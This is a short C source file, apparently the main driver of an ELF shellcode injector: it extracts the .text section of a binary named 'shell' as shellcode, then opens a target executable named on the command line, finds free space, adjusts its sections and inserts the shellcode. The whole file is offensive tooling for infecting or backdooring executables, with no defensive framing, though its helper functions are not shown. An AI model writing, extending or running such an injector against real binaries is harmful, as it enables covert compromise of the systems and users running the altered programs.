#include "util.h"
#include "elffile.h"
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>

char *parse_args(int argc, char *argv[])
{
    for(int i = 0; i < argc; i++){
        if(strcmp(argv[i], "-f") == 0){
            return argv[i + 1];
        }
    }
    return NULL;
}

int main(int argc, char *argv[])
{
    Shellcode *s = ShellcodeConstructor("shell");
    if(s == NULL)
        goto err;

    int index = s->m_elf->FindSectionIndexByName(s->m_elf   \
            , ".text");
    if(index < 0)
        goto err1;

    if(s->ShellcodeExtractText(s, index) < 0)
        goto err;

    Target *t = TargetConstructor(argv[1]);
    if(t == NULL)
        goto err1;

    if(t->TargetFindFreeSpace(t, s->m_size) <0)
        goto err2;

    t->TargetAdjustSections(t, s->m_size);
    t->TargetInsertShellcode(t, s);

err2:
    TargetDestructor(t);

err1:
    ShellcodeDestructor(s);

err:
    return 0;
}
